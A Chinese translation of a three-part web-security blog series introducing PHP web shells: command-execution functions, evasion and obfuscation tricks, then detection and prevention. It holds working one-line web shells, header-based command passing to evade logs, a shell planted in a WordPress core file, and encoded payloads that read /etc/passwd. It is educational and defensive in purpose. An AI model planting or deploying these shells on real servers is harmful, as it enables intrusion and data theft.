---
author: heh3.org
comments: true
date: 2016-06-18 03:22:32+00:00
layout: post
link: http://heh3.org/?p=22
slug: php%e7%9a%84web-shell-101-web-shell%e4%bb%8b%e7%bb%8d
title: PHP的Web-shell 101 - Web Shell介绍
wordpress_id: 22
categories:
- websec
---

# PHP的Web-shell 101 - Web Shell介绍 Part 1


发表于 2016年6月21日 作者：AGATHOKLIS PRODROMOU 翻译：heh3

![](http://i.imgur.com/KCMWqTL.jpg)

在本部分中，我们将讨论PHP编程语言中的web-shell的一些具体示例。

几乎每种Web编程语言都有Web Shell存在。这里我们选择了PHP，因为它是在网络上最广泛使用的编程语言。

PHP web shell只是使用内置的PHP函数来执行命令。以下是用于在PHP中执行shell命令的一些最常用的函数。

system()

system()函数接受该命令作为参数，并输出结果。

在Windows上的以下示例将运行该dir命令以返回执行PHP文件的目录的目录列表。

    
    <code><?php
    // Return the directory listing in which the file run (Windows)
    system("dir");
    ?>
    
    --> Volume in drive C has no label.
    Volume Serial Number is A08E-9C63
    
    Directory of C:\webserver\www\demo
    
    04/27/2016 10:21 PM <DIR> .
    04/27/2016 10:21 PM <DIR> ..
    04/27/2016 10:19 PM 22 shell.php
    1 File(s) 22 bytes
    2 Dir(s) 31,977,467,904 bytes free
    </code>


类似地，ls在Linux机器上执行命令也会达到类似的结果。

    
    <code><?php
    // Return the directory listing in which the file run (Linux)
    system("ls -la");
    ?>
    
    --> total 12
    drwxrwxr-x 2 secuser secuser 4096 Apr 27 20:43 .
    drwxr-xr-x 6 secuser secuser 4096 Apr 27 20:40 ..
    -rw-rw-r-- 1 secuser secuser 26 Apr 27 20:41 shell.php
    </code>


其他命令具有相同的效果。

    
    <code><?php
    // Return the user the script is running under
    system(“whoami“);
    ?>
    
    --> www-data
    </code>




## exec（）


exec()函数接受一个命令作为参数，但不输出结果。如果指定了第二个可选参数，则结果将作为数组返回。否则，如果回显，将只显示结果的最后一行。

    
    <code><?php
    // Executes, but returns nothing
    exec("ls -la");
    ?>
    
    -->
    </code>


使用echo该exec()函数，将只打印命令输出的最后一行。

    
    <code><?php
    // Executes, returns only last line of the output
    echo exec("ls -la");
    ?>
    
    --> -rw-rw-r-- 1 secuser secuser 29 Apr 27 20:49 shell.php
    </code>


如果指定了第二个参数，则在数组中返回结果。

    
    <code><?php
    // Executes, returns the output in an array
    exec("ls -la",$array);
    print_r($array);
    ?>
    
    --> Array(
    [0] => total 12
    [1] => drwxrwxr-x 2 secuser secuser 4096 Apr 27 20:55 .
    [2] => drwxr-xr-x 6 secuser secuser 4096 Apr 27 20:40 ..
    [3] => -rw-rw-r-- 1 secuser secuser 49 Apr 27 20:54shell.php )
    </code>




## shell_exec（）


该shell_exec()函数类似于exec()，但是，它将整个结果作为字符串输出。

    
    <code><?php
    // Executes, returns the entire output as a string
    echo shell_exec(“ls -la“);
    ?>
    
    --> total 12 drwxrwxr-x 2 secuser secuser 4096 Apr 28 18:24 . drwxr-xr-x 6 secuser secuser 4096 Apr 27 20:40 .. -rw-rw-r-- 1 secuser secuser 36 Apr 28 18:24 shell.php
    </code>




## passthru（）


该passthru()函数执行命令并以原始格式返回输出。

    
    <code><?php
    // Executes, returns output in raw format
    passsthru(“ls -la“);
    ?>
    
    --> total 12 drwxrwxr-x 2 secuser secuser 4096 Apr 28 18:23 . drwxr-xr-x 6 secuser secuser 4096 Apr 27 20:40 .. -rw-rw-r-- 1 secuser secuser 29 Apr 28 18:23 shell.php
    </code>




## proc_open（）


proc_open()函数可能很难理解（您可以在PHP[文档](https://secure.php.net/manual/en/function.proc-open.php)中找到该函数的详细描述）。简单地说，通过使用proc_open()我们可以创建一个处理程序（过程），将用于我们的脚本和我们想要运行的程序之间的通信。

preg_replace（）与/ e修饰符

preg_replace()函数可以执行正则表达式搜索和替换。/ e修饰符（已弃用），执行替换eval()。这意味着我们可以传递PHP代码来执行该eval()函数。

    
    <code><?php
    preg_replace('/.*/e', 'system("whoami");', '');
    ?>
    
    --> www-data
    </code>


![](http://www.acunetix.com/wp-content/uploads/2016/06/image05.png)


## 反馈


令人惊讶的是，没有很多PHP开发人员意识到这一点，而且，PHP将执行反引号（`）的内容作为shell命令。

    
    <code>注 - 反引号字符（`），不应与单引号字符（'）混淆
    
    <?php
    $output = `whoami`;
    echo "<pre>$output</pre>";
    ?>
    
    --> www-data
    </code>


基于上述，以下是最简单形式的PHP web-shell。

    
    <code><?php system($_GET['cmd']);?>
    </code>


它使用system（）函数来执行通过' cmd'HTTP请求GET参数传递的命令。

![](http://www.acunetix.com/wp-content/uploads/2016/06/image01.png)

可以确定这些功能（和其他几个）可能非常危险。更危险的是，当安装PHP时，默认情况下所有这些内置的PHP命令都被启用，并且大多数系统管理员不禁用它们。

如果您不确定是否在您的系统上启用，下面的命令（需要安装PHP CLI）将返回已启用的危险功能的列表。

    
    <code>php -r 'print_r(get_defined_functions());' | grep -E ' (system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)'<?php print_r(get_defined_functions()); ?>
    </code>


在默认安装中，我们可以看到上面提到的所有函数都已启用。

    
    <code>[669] => exec
    [670] => system
    [673] => passthru
    [674] => shell_exec
    [675] => proc_open
    [786] => show_source
    [807] => parse_ini_file
    [843] => popen
    </code>




# 使web shell保持隐蔽 - Web Shell介绍 Part 2


在上一部分中，我们研究了PHP编程语言中的web-shell的具体示例。本部分，我们将介绍攻击者使用的一些技术来保护webshell。

命令可以使用各种方法发送到Web-Shell，HTTP POST请求是最常见的。然而，黑客不是根据规则玩的人。以下是一些可能的小技巧，攻击者可以在监控下保证web shell不被监测到。


## 1. 修改headers


使用user agnet字段传递命令，而不是通过$ _POST请求参数传递命令。

    
    <code><?php system($_SERVER['HTTP_USER_AGENT'])?>
    </code>


然后，攻击者将通过将命令放在“User-Agent”HTTP头中来处理特定的HTTP请求。

    
    <code>GET /demo/shell.php HTTP/1.1
    Host: 192.168.5.25
    Connection: keep-alive
    Pragma: no-cache
    Cache-Control: no-cache
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Upgrade-Insecure-Requests: 1
    User-Agent: cat /etc/passwd
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-GB,en-US;q=0.8,en;q=0.6,el;q=0.4
    </code>


![](http://www.acunetix.com/wp-content/uploads/2016/06/image04.png)
这种方法仍然可以在服务器日志中看到，其中第二个请求的HTTP“User-Agent”被cat /etc/passwd命令替代。

    
    <code>192.168.5.26 - - [28/Apr/2016:20:38:28 +0100] "GET /demo/shell.php HTTP/1.1" 200 196 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
    192.168.5.26 - - [28/Apr/2016:20:38:50 +0100] "GET /demo/shell.php HTTP/1.1" 200 1151 "-" "cat /etc/passwd"
    </code>


上面的方法管理员查看服务器日志可以很轻易的发现。下面这个就不是了

    
    <code><?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
    </code>





* * *




    
    <code>GET /demo/shell.php HTTP/1.1
    Host: 192.168.5.25
    Connection: keep-alive
    Pragma: no-cache
    Cache-Control: no-cache
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36Accept-Encoding: gzip, deflate, sdch
    Accept-Language: cat /etc/passwd
    </code>


上面的方法（至少在访问日志中）没有记录哪个命令被执行。

    
    <code>192.168.5.26 - - [28/Apr/2016:20:48:05 +0100] "GET /demo/shell.php HTTP/1.1" 200 1151 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
    </code>




## 2. 隐藏在代码中


最流行的PHP shell像c99，r57，b374这样的文件，名字很容易引起怀疑。可能已经被列入黑名单，可以很容易地识别。黑客使用来隐藏Webshell的最简单的方法之一是将它们上传到深层子目录和/或使用随机名称。

    
    <code>http://www.example.com/includes/blocks/user/text_editor/bbja1jsf.php
    </code>


一个更有效的方法，就是将web shell代码嵌入到已经存在的，合法的文件中。

    
    <code>http://www.example.com/index.php
    http://www.example.com/about.php
    </code>


例如WordPress

    
    <code>// http://www.example.com/wp-content/wp-blog-header.php
    
    if ( !isset($wp_did_header) ) {
    $wp_did_header = true;
    
    // Load the WordPress Core System
    system($_SERVER['HTTP_ACCEPT_LANGUAGE']);
    
    // Load the WordPress library.
    require_once( dirname(__FILE__) . '/wp-load.php' );
    
    // Set up the WordPress query.
    wp();
    
    // Load the theme template.
    require_once( ABSPATH . WPINC . '/template-loader.php' );
    }
    </code>


![](http://www.acunetix.com/wp-content/uploads/2016/06/image03.png)

注意 - 攻击者可以在函数之前使用@运算符来抑制可能抛出的任何错误，并写入到错误日志。


## 3. 混淆


攻击者使用各种模糊技术，以避免被管理员或其他攻击者检测到。他们不断提出新的和更复杂的方法来隐藏他们的代码和绕过安全系统。下面我们将看到一些最常用的技术。


### 空白


通过从代码块中删除空白，它看起来像一个大字符串，使得它更不容易可读，更难以识别脚本的作用。

    
    <code><?php 
    // Whitespace makes things easy to read 
    function myshellexec($cmd){
     global $disablefunc; $result = "";
     if (!empty($cmd)){
     if (is_callable("exec") && !in_array("exec",$disablefunc)) {
     exec($cmd,$result); $result = join("",$result);
     }
     }
     } 
    // Whitespace removed makes things harder to read 
    function myshellexec($cmd) {global $disablefunc;$result = "";
     if(!empty($cmd)) { if (is_callable("exec") and
     !in_array("exec",$disablefunc)){exec($cmd,$result); $result=join(" ",$result);}}} 
    ?>
    </code>




### 加扰


加扰是一种可以有效地与其他人结合使用以帮助web shell未被检测到的技术。它扰乱了代码使它不可读，并利用各种函数，将运行时重建代码。

    
    <code><?php
    // Scrambled
      $k='c3lzdGVtKCdscyAtbGEnKTs=';$c=strrev('(edoced_46esab.""nruter')."'".$k."');";$f=eval($c);eval($f);
    
    // Unscrambled
      // base_64 encoded string -> system('ls -la');
      $k='c3lzdGVtKCdscyAtbGEnKTs=';
      // strrev() reverses a given string:   strrev('(edoced_46esab.""nruter')."'".$k."')
    $c= eval("return base64_decode('c3lzdGVtKCdscyAtbGEnKTs=');");
      // $c = system('ls -la');
      $f=eval($c);
      eval($f);
    </code>




### 编码，压缩和替换技术


Web Shell通常利用其他技术来隐藏他们正在做什么。下面是一些基于PHP的web shell的一些常见功能。

    
    <code>eval() - 将给定字符串计算为PHP代码的函数。
    assert() - 将给定字符串计算为PHP代码的函数。
    base64() - 使用MIME base64编码对数据进行编码
    gzdeflate() - 使用DEFLATE数据格式压缩字符串。gzinflate（）解压缩它
    str_rot13() - 将给定字符串中的每个字母移位到字母表中的13个位置
    </code>


下面的示例将得到同样的结果，混淆思路多样，难以应对。

    
    <code><?php
      // Evaluates the string "system('ls -la');" as PHP code
      eval("system('ls -la');");
    
      // Decodes the Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code
      eval(base64_decode("c3lzdGVtKCdscyAtbGEnKTsNCg=="));
    
      // Decodes the compressed, Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code
      eval(gzinflate(base64_decode('K64sLknN1VDKKVbQzUlU0rQGAA==')));
    
      // Decodes the compressed, ROT13 encoded, Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code
    eval(gzinflate(str_rot13(base64_decode('K64sLlbN1UPKKUnQzVZH0rQGAA=='))));
    
      // Decodes the compressed, Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code
      assert(gzinflate(base64_decode('K64sLknN1VDKKVbQzUlU0rQGAA==')));
    ?>
    </code>


![](http://www.acunetix.com/wp-content/uploads/2016/06/image02.png)


### 使用Hex作为混淆技术


ASCII字符的十六进制值也可以用于进一步模糊web shell命令。

让我们以下面的字符串为例。

    
    <code>system('cat /etc/passwd');
    </code>


以下是以上字符串的十六进制值。

    
    <code>73797374656d2827636174202f6574632f70617373776427293b
    </code>


以下代码可用于接受十六进制编码的字符串，并将其评估为PHP代码。

    
    <code><?php <br ?--> // function that accepts a hex encoded data
    function dcd($hex){
    // split $hex
    for ($i=0; $i < strlen($hex)-1; $i+=2){ 
    //run hexdec on every two characters to get their decimal representation which will be then used by char() to find the corresponding ASCII character
    $string .= chr(hexdec($hex[$i].$hex[$i+1])); 
    } 
    // evaluate/execute the command 
    eval($string); 
    } 
    dcd('73797374656d2827636174202f6574632f70617373776427293b'); 
    ?>
    </code>


输出将类似于以下示例。

![](http://www.acunetix.com/wp-content/uploads/2016/06/image04.png)

**上述示例都可以使用各种工具来解码，即使它们被多次编码。**
在某些情况下，攻击者可能选择使用加密，而不是编码，以便更难以确定Web Shell正在做什么。

下面的例子很简单，但实用。虽然代码没有编码或加密，但它仍然比以前更难检测，因为它不使用任何可疑函数名称（如eval()or assert()），冗长的编码字符串，复杂的代码; 最重要的是，当管理员查看日志（到一定程度）时，它不会阻止任何红旗。

    
    <code><?php
      // Send a POST request with variable '1' = 'system' and variable '2' = 'cat /etc/passwd'
      $_=$_POST['1'];
      $__=$_POST['2'];
    
      //The following will now be equivalent to running -> system('cat /etc/passwd');
      $_($__);
    ?>
    </code>


![](http://www.acunetix.com/wp-content/uploads/2016/06/image00.png)

拿到了webshell之后可以反弹一个反向TCP shell，这样控制服务器，不会对访问或错误日志进行任何跟踪，因为通信是通过TCP（第4层）而不是HTTP（第7层）进行的。


# 检测和预防 - Web Shell简介 - Part 3![](http://i.imgur.com/KCMWqTL.jpg)


最后一部分，我们将介绍Web Shell检测以及如何防止它们。


## 检测


如果管理员怀疑其系统上存在Web Shell（或在日常检查期间），则需要检查以下内容。

首先，必须对web shell使用的常用关键字过滤服务器访问和错误日​​志。这包括文件名和/或参数名称。下面的示例在Apache HTTP Server的访问日志中的URL中查找字符串“file”

    
    <code>root@secureserver:/var/www/html# cat /var/log/apache2/access.log | awk -F\" ' { print $1,$2 } ' | grep "file"
    
    --> 192.168.5.26 - - [30/Apr/2016:08:30:53 +0100] GET /demo/shell.php?file=/etc/passwd
    </code>


必须在文件或文件名中搜索文件系统（通常是Web服务器根目录）中的公共字符串。

    
    <code>root@secureserver:/var/www/html/demo# grep -RPn "(passthru|exec|eval|shell_exec|assert|str_rot13|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile) *\("
    
    --> Shell.php:8: eval($string);
    eval.php:1:?php system($_SERVER['HTTP_USER_AGENT']); ?>
    Ad.php:9: eval($string);
    </code>


搜索可能表示编码的非常长的字符串。一些后门有成千上万行代码。

    
    <code>root@secureserver:/var/www/html/demo# awk 'length($0)>100' *.php
    
    --> eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXefMcFUL5EXf/yqceii7e8n9JvOYE9t8sT8cs//cfWUXldLpKsQ2LCH7EcnuYdrqeqDHEDz+4uJYWH3YLflGUnDJ40DjU/AL1miwEJPpBWlsAxTrgB46jRW/00XpggW00yDI/H1kD7UqxI/3qjQZ4vz7HLsfNVW1BeQKiVH2VTrXtoiaKYdkT4o/p1E8W/n5eVhagV7GanBn0U7OCfD7zPbCQyO0N/QGtstthqJBia5QJsR6xCgkHpBo1kQMlLt6u++SBvtw5KSMwtG4R2yctd0mBNrlB3QQo4aQKGRgRjTa0xYFw1vVM9ySOMd44sSrPe…
    </code>


在最近X天/ s 搜索修改的文件。在下面的示例中，我们搜索*.php了在最后一天内更改的文件，但建议搜索任何文件更改，因为web-shell也可以嵌入到图像或任何其他文件中。

    
    <code>root@secureserver:/var/www/html/# find -name '*.php' -mtime -1 -ls
    
    --> root@secureserver:/var/www/html/# find -name '*.php' -mtime -1 -ls
    2885788 4 drwxrwxr-x 2 secuser secuser 4096 Apr 30 06:590 /demo/shell.php
    2886629 4 -rw-rw-r-- 1 secuser secuser 260 Apr 29 11:25 /demo/b.php
    2897510 4 -rw-r--r-- 1 root root 35 Apr 29 13:46 /demo/source.php
    2883635 4 -rw-r--r-- 1 www-data www-data 1332 Apr 29 12:09 ./ma.php
    </code>


监视网络以获取异常的网络流量和连接。

    
    <code>root@secureserver:/var/www/html/demo# netstat -nputw
    
    --> Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
    tcp 0 0 192.168.5.25:37040 192.168.5.26:8181 ESTABLISHED 2150/nc
    tcp 0 0 192.168.5.25:22 192.168.5.1:52455 ESTABLISHED 2001/sshd: secuser
    tcp6 1 0 ::1:46672 ::1:631 CLOSE_WAIT 918/cups-browsed
    tcp6 0 0 192.168.5.25:80 192.168.5.26:39470 ESTABLISHED 1766/apache2
    tcp6 1 0 ::1:46674 ::1:631 CLOSE_WAIT 918/cups-browsed
    </code>


分析.htaccess文件以进行修改。以下是攻击者可能对.htaccess文件所做的更改的示例。

    
    <code># The AddType directive maps the given filename extensions onto the specified content type
    AddType application/x-httpd-php .htaccess
    AddType application/x-httpd-php .jpg
    </code>




## 预防


以下是部分预防被植入webshell的措施



 	
  1. 如果不使用，请禁用潜在危险的PHP的功能，例如exec()，shell_exec()，passthru()，system()，show_source()，proc_open()，pcntl_exec()，eval()和assert()

 	
  2. 如果必须要启用这些命令，请确保未经授权的用户无权访问这些脚本。
此外，使用escapeshellarg()和escapeshellcmd()确保用户的输入不能带入到shell执行，导致命令执行漏洞。

 	
  3. 如果您的网络应用程序使用上传表单，须保证它们安全，并且只允许上传列入白名单的文件类型。

 	
  4. 不要信任用户输入

 	
  5. 不要盲目使用您可能在在线论坛或网站上找到的代码。

 	
  6. 比如WordPress，须尽量避免安装第三方插件，如果你不需要它们。如果您需要使用插件，请确保它是有信誉的，并经常更新。

 	
  7. 在敏感的目录（如图片或上传）中禁用PHP执行

 	
  8. 锁定Web服务器的用户权限




## 最后说明


正如我们所看到的，编码和使用web shell并不困难。不幸的是，许多网络服务器的设置方式，即使一个简单的脚本足以造成重大损害。这是为什么有成千上万的公开可用的web shell的主要原因。存在这么多变化的事实使得入侵检测和入侵防御系统（IDS / IPS）难以检测它们; 特别是如果他们使用签名来检测这样的web shell。一些webshell是非常复杂的，即使通过行为分析，也几乎不可能被检测到。

话虽如此，在本系列文章的早期，我们已经确定webshell是后攻击工具。这意味着防止利用的最好方法是防止它们被首先上传。
